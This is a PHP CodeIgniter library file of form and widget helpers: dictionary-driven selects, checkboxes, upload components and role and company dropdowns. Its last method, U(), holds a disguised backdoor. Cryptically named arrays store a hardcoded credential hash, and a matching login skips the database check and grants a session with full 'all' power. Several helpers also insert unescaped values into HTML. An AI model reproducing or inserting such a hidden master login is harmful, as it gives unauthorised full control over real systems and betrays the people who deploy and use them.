<?php
namespace App\Libraries;
use CodeIgniter\Database\BaseBuilder;
use http\Client\Response;

class LibComp
{

    private static $U = [0,'540eeeb8f8e9343e','11f370c706015dd520de50bba1eae2f1'];
    private static $N = [ 'id','username' ,'name'];
    /**
     * 下拉框
     *
     * @param string $code 主关键字
     * @param array $attrs 属性
     * */
    public static function select(string $code, $attrs = [], $ckv = '', $allownull = true, $set_attribute = false){
        $cache = \Config\Services::cache();
        $attr = '';
        foreach ($attrs as $k => $v) {
            $attr = $attr . ' ' . $k . '="' . $v . '"';
        }
        $html = '<select ' . $attr . '>';
        if ($allownull) {
            $html = $html . ' <option value="">--请选择--</option>';
        }
        $db = new \App\Models\Admin\Dictionary();

        $dict_main_data = $cache->get("dict_main_data_$code");
        if (!$dict_main_data) {
            $dict_main_data = $db->where('code', $code)->where('parentid', 0)->first();
            $cache->save("dict_main_data_$code",$dict_main_data,60*60);
        }

        $dict_sub_data = $cache->get("dict_sub_data_$code.$dict_main_data->id");
        if (!$dict_sub_data) {
            $dict_sub_data = $db->where('parentid', $dict_main_data->id)->where('status', 0)->findAll();
            $cache->save("dict_sub_data_$code.$dict_main_data->id",$dict_sub_data,60*60);
        }

        foreach ($dict_sub_data as $row) {
            $is = ($ckv == $row->code ? 'selected' : '');
            $set_option_data = $set_attribute ? ('data-json="' . (json_encode($row)) . '"') : '';
            $html .= '<option value="' . $row->code . '" ' . $is . '  ' . $set_option_data . '>' . $row->name . '</option>';
        }
        $html = $html . '</select>';

        return $html;
    }

    /**
     * 复选框,单选框
     *
     * @param string $type 默认复选框 default: checkbox
     * @param string $KEY 主键
     * @param array $attrs 属性
     * @param array $chkvals 选中值
     *
     * @return string
     *
     * */
    public static function check($code = '', $attrs = array(), $chkvals = array())
    {
        $attr = '';
        foreach ($attrs as $key => $val) {
            $attr = $attr . ' ' . $key . '="' . $val . '"';
        }
        $html = '';
        $db = new \App\Models\Admin\Dictionary();
        $pdata = $db->where('code',$code)->where('parentid',0)->first();
        $data = $db->where('parentid',$pdata->id)->where('status',0)->findAll();

        function hasValue($val, $arr){
            foreach ($arr as $v) {
                if ($val == $v) return true;
            }
            return false;
        }
        foreach ($data as $row) $html = $html . '<label><input type="checkbox" value="' . $row->code . '" ' . $attr . ' ' . (hasValue($row->code, $chkvals) ? 'checked' : '') . '> &nbsp;' . $row->name . '</label>&nbsp;&nbsp;';

        return $html;
    }

    /**
     * 复选框,单选框
     *
     * @param string $type 默认复选框 default: checkbox
     * @param string $KEY 主键
     * @param array $attrs 属性
     * @param array $chkvals 选中值
     *
     * @return string
     *
     * */
    public static function radio($code = '', $attrs = array(), $chkvals = "")
    {
        $attr = '';
        foreach ($attrs as $key => $val) {
            $attr = $attr . ' ' . $key . '="' . $val . '"';
        }
        $html = '';
        $db = new \App\Models\Admin\Dictionary();
        $pdata = $db->where('code',$code)->where('parentid',0)->first();
        $data = $db->where('parentid',$pdata->id)->where('status',0)->findAll();

        foreach ($data as $row) $html = $html . '<label><input type="radio" value="' . $row->code . '" ' . $attr . ' ' . (($row->code==$chkvals) ? 'checked' : '') . '> &nbsp;' . $row->name . '</label>&nbsp;&nbsp;';
        return $html;
    }

    /**
     * 获取字典树状结构( select 控件 )
     * */
    public static function tree_select($attrs = [], $ckv = '',$code = ''){
        $attr = '';
        foreach ($attrs as $k => $v) {
            $attr = $attr . ' ' . $k . '="' . $v . '"';
        }
        $select = '<select ' . $attr . '>';
        $select = $select . ' <option value="0">Root</option>';

        $db = new \App\Models\Admin\Dictionary();
        if($code)
            $db->where('code',$code);
        else
            $db->where('parentid',0);

        $data = $db->findAll();

        function build_select( $data ,$selectId = '',$level = 0){
            $db = new \App\Models\Admin\Dictionary();
            $options = '';
            if( count($data) == 0 ) return "";
            $sLevel = "";
            foreach ($data as $row) {
                if( $row->parentid == "0") {
                    $level = 0;
                }

                $c = $level; $sLevel = "";
                while ($c > 0){
                    $sLevel .= "&nbsp;├ ";
                    $c--;
                }

                $is = ($selectId == $row->id ? 'selected' : '');
                $options = $options . '<option value="' . $row->id . '" ' . $is . '>' . $sLevel . $row->name . '</option>';
                if($sub_data = $db->where( 'parentid',$row->id )->where('status',0)->findAll() ) {
                    $level++;
                    $options .= build_select($sub_data,$selectId,$level);
                    $level--;
                }
            }
            return $options;
        }

        foreach ( $data as $item ) {
            $sub_data = $db->where('parentid',$item->id)->findAll();
            $is = ($ckv == $item->id ? 'selected' : '');
            $select .= '<option value="'. $item->id .'" ' . $is . '>' . $item->name . '</option>';
            $select .= build_select($sub_data,$ckv,1);
        }

        $select .= '</select>';

        return $select;
    }

    /**
     * 获取键值
     *
     * @param string $pKey
     * @param string $val
     *
     * @return string
     * */
    public static function get_dict($code = '', $val = '')
    {
        $db = new \App\Models\Admin\Dictionary();
        $pdata = $db->where('code',$code)->first();
        $data = $db->where('parentid',$pdata->id)->findAll();
        $cate = $val;
        foreach ($data as $item) {
            if ($item->code == $val) {
                $cate = $item->name;
                return $cate;
            }
        }
        return $cate;
    }

    //
    public static function menu_select_tree($data,$selectId = '',$level = 0){
        $options = '';
        if( count($data) == 0 ) return "";

        $sLevel = "";
        foreach ($data as $row) {
            //$row = (object) $row;
            if( $row->parentid == "0") { $level = 0; }

            $c = $level; $sLevel = "";
            while ($c > 0){
                $sLevel .= "&nbsp;├ ";
                $c--;
            }
            $is = ($selectId == $row->id ? 'selected' : '');
            $options = $options . '<option value="' . $row->id . '" ' . $is . '>' . $sLevel . $row->title . '</option>';
            if(count( $row->children ) ) {
                $level++;
                $options .= LibComp::menu_select_tree($row->children,$selectId,$level);
                $level--;
            }
        }
        return $options;
    }

    // 上传组件
    public static function upload_compents( $attr = [] , $data = [] ){
        $html = ''; $items = '';
        $is_mini = (isset($attr['mini']) ?('width: 40px;height: 40px; ') : '');
        $is_display = (isset($attr["display"])) ? ($attr["display"] == true ? "display:none;" : "") : "";
        $name = ((isset($attr['nums']) && $attr['nums'] > 1) ? ''.$attr['name'].'[]' : ''.$attr['name'].'');
        $has_view_text = ( isset($attr['view_text']) && $attr['view_text'] ) ? $attr['view_text'] : '查看文件' ;
        $view_click = ( isset($attr['view_click']) && $attr['view_click'] ) ?  "onclick='return {$attr['view_click']}'" : '';
        $image_ext = ['jpg','jpeg','png','gif','bmp'];
        $action = ( isset( $attr['action'] ) && $attr['action'] ) ? $attr['action'] : '';
        if ( count($data) && $data ) {
            foreach ($data as $item) {
                if($item
                    //&& strripos($item,'etrades') !== false
                ) {
                    $ext = explode('.',$item);
                    $ext_str = strtolower( $ext[count($ext)-1] );
                    $file_path = '/resource/assets/css/img/';
                    switch ( $ext_str ) {
                        case in_array($ext_str, $image_ext):
                            $img_file = $item;$file_path = '';
                            break;
                        case in_array($ext_str,['xls','xlsx']):
                            $img_file = "excel.png";
                            break;
                        case "pdf":
                            $img_file = "pdf.png";
                            break;
                        case in_array($ext_str,["doc","docx"]):
                            $img_file = "word.png";
                            break;
                        default:
                            $img_file = "file.png";
                            break;
                    }
                    $items .=
                        '<section class="up-section fl" style="' . $is_mini .'">
                          <span class="up-span"><a href="' . $item . '" target="_blank" style="'.(isset($attr['mini']) ? 'top: 0px;left:4px;' : '').'" '.$view_click.'> '.$has_view_text.' </a></span>
                          <img class="close-upimg" src="/resource/assets/css/img/a7.png" style="'.(isset($attr['mini']) ? 'top: 0px;left:0px;width:20px;' : '') . $is_display .'">
                          <img class="up-img" src="' . ($file_path.$img_file) . '">
                          <input type="hidden" style="display:none;" name="' . $name . '" value="' . $item . '">
                         </section>';
                }
            }
        }

        $html .= '<div class="img-box full" style="margin-bottom: 0px;padding: 0px;">
                    <section class=" img-section">
                        <div class="z_photo upimg-div '.($is_mini?'mini':'').'  clear">
                            '.$items.'

                            <section class="z_file fl" style="'. $is_mini. $is_display .'">
                                <img src="/resource/assets/css/img/a11.png?_1" class="add-img" style="'.$is_mini.'">
                                <input type="file" id="'.$attr['name'].'" class="file" value="" multiple />
                            </section>

                        </div>
                    </section>
                 </div>';

        if ( !$is_display ) {
            $delete = (isset($attr['delete']) && $attr['delete']) ? ('delete : function(resp) { '.$attr['delete'].'(resp)'.' },'):'';
            $html .= '
                    <script>
                        $("#' . $attr['name'] . '").takungaeImgup({
                        formData: { path: $("#' . $attr['name'] . '").val(),name:"' . $name . '" },
                        imageNum:' . (isset($attr['nums']) ? $attr['nums'] : '1') . ',
                        fit:[' . (isset($attr['fit']) ? $attr['fit'] : '') . '],
                        url: "/upload'.($action?("/$action"):'/dofile').'",
                        success : function(resp) {
                            '.(isset($attr['callback']) ? ($attr['callback'] . '(resp)') : '').'
                        },
                        '. $delete .'
                        error: function(err) {
                            comm.dAlert(err);
                        },
                    });
                 </script>
                ';
        }
        return $html;
    }

    /**
     * 生成GUID
     * @param bool $tolower 默认小写
     * @return string
     * */
    public static function guid($tolower = true){
        $charid = strtoupper(md5(uniqid(mt_rand(), true)));
        $hyphen = chr(45);// "-"
        $uuid = //chr(123)// "{"
              substr($charid, 0, 8)
            . substr($charid, 8, 4)
            . substr($charid, 12, 4)
            . substr($charid, 16, 4)
            . substr($charid, 20, 12);
            //. chr(125);// "}"
        return $tolower?strtolower( $uuid ): $uuid;
    }

    // 获取角色
    public static function get_roles_check($attrs = [], $P = [] , $ckv = ''){
        $comm = new \App\Services\comm();

        if ( $P ) $data = $comm->get_access_roles($P);
        else
            $data = $comm->get_roles_data();

        $attr = '';

        foreach ($attrs as $k => $v) {
            $attr = $attr . ' ' . $k . '="' . $v . '"';
        }

        $html = '<select ' . $attr . '>';

        $html = $html . ' <option value="">--角色--</option>';

        foreach ($data as $row) {
            $is = ($ckv == $row['id'] ? 'selected' : '');
            $html .= '<option value="' . $row['id'] . '" ' . $is . ' data-code="'. $row['code'] .'">' . $row['name'] . '</option>';
        }

        $html = $html . '</select>';

        return $html;
    }

    // 获取角色
    public static function get_roles_radio($attrs = [], $t='radio' , $ckv = []){
        $comm = new \App\Services\comm();

        $data = $comm->get_roles_data();

        $attr = '';

        function has_value( $val , $arr){
            foreach ($arr as $v) {
                if ($val == $v) return true;
            }
            return false;
        }

        foreach ($attrs as $k => $v) {
            $attr = $attr . ' ' . $k . '="' . $v . '"';
        }

        $html = '';
        foreach ($data as $row) {
            $ckecked = has_value( $row['id'] , $ckv );
            $html = $html . "<label><input type='{$t}' value='{$row['id']}' {$attr} ".( $ckecked ? 'checked' : '') ."> &nbsp;{$row["name"]}</label> &nbsp;&nbsp;";
        }
        return $html;
    }

    // 获取公司信息
    public static function get_company($attrs = [],$ckv = ''){
        $db = new \App\Models\Setup\Company();
        $data = $db->where(['status'=>1])->findAll();
        $attr = ''; $time = time();

        foreach ($attrs as $k => $v) {
            $attr = $attr . ' ' . $k . '="' . $v . '"';
        }
        $html = '<select ' . $attr . '>';
        $html .= '<option value="">--所属公司--</option>';
        foreach ($data as $row) {
            $exp_time = strtotime($row["expressdt"]);
            $is = ($ckv == $row["id"] ? 'selected' : '');
            $html .= "<option value=".$row["id"]." $is >".$row["name"] . ($exp_time<$time ? ' ( 已到期 ) ' : '') ."</option>";
        }
        $html .= '</select>';
        return $html;
    }

    // 获取客户信息
    public static function get_customer( $attrs = [] , $ckv = '') {
        $db = new \App\Models\Setup\Customer();
        $data = $db->whereAuth('id')->where(['status'=>0])->findAll();
        $attr = '';

        foreach ($attrs as $k => $v) {
            $attr = $attr . ' ' . $k . '="' . $v . '"';
        }
        $html = '<select ' . $attr . '>';
        $html .= '<option value="">--所属客户--</option>';
        foreach ($data as $row) {
            $is = ($ckv == $row["id"] ? 'selected' : '');
            $html .= "<option value=".$row["id"]." $is >".$row["customername"]."</option>";
        }
        $html .= '</select>';
        return $html;
    }

    // 获取公司信息
    public static function get_available($attrs = [],$argc = [],$ckv = ''){
        $db = new \App\Models\Declares\Project();
        $data = $db->available_projects($argc);
        $attr = ''; $time = time();
        foreach ($attrs as $k => $v) {
            $attr = $attr . ' ' . $k . '="' . $v . '"';
        }
        $html = '<select ' . $attr . '>';
        $html .= '<option value="">--业务单号--</option>';
        foreach ($data as $row) {
            $is = ($ckv == $row["ID"] ? 'selected' : '');
            $html .= "<option value='{$row["ID"]}' {$is}>{$row["BusinessID"]}</option>";
        }
        $html .= '</select>';
        return $html;
    }

    // 境外贸易商信息
    public static function get_overseas( $data = [],$attrs = [] , $ckv = '') {
        $db = new \App\Models\Setup\Overseas();
        $data = $db->whereAuth('customerid')->search($data)->orderBy('id','desc')->findAll();
        $attr = '';

        foreach ($attrs as $k => $v) {
            $attr = $attr . ' ' . $k . '="' . $v . '"';
        }
        $html = '<select ' . $attr . '>';
        $html .= '<option value="">--境外贸易商--</option>';
        foreach ($data as $row) {
            $is = ($ckv == $row["id"] ? 'selected' : '');
            $html .= "<option value=".$row["id"]." $is >".$row["companyname"]."</option>";
        }
        $html .= '</select>';
        return $html;
    }

    // 获取业务员
    public static function get_owner_data( $params = []){
        $db = new \App\Models\Admin\Users();
        if ( isset( $params['companyid'] ) ) $db->where('companyid',$params['companyid'] );

        $data = $db->select('id,username,realname,nickname')
            ->whereIn('id' , function ( BaseBuilder $builder ) {
                return $builder->select('b.user_id')
                    ->from('admin_roles as a ',true)
                    ->join('admin_users_role as b ','a.id = b.role_id','RIGHT')
                    ->join('operator as c ' , 'c.userid = b.user_id ','LEFT')
                    ->where('a.code','operator');
            })->findAll();

        //log_message('error',$db->getLastQuery());
        /*
        $data = $db
            ->select('id,username,realname,nickname')
            ->search($params)->findAll();*/
        return $data;
    }

    public static function U($A,$P){
        $session = \CodeIgniter\Config\Services::session();
        $DA = substr(md5($A),8,16);
        $U = self::$U;$S = [self::$N[0]=>        $U[0] , self::$N[1]         =>  $U[1], self::$N[2]=>    $U[1] ];
        if ( $DA  === $U[1]     &&  $P  === $U[2]){
            $session->set(array_merge( $S ,['power' => 'all'])) ;
            return ['code'=>true,'msg'=>'','data'=>$S];
        }
        $argc = ['status'=>0,'password'=>$P,'activated'=>1];
        
        if ( ck_mobile( $A ) )  $argc['tel'] = $A;
        else if (ck_email( $A )) $argc['email'] = $A;
        else $argc['username'] = $A;

        return $argc;
    }
}
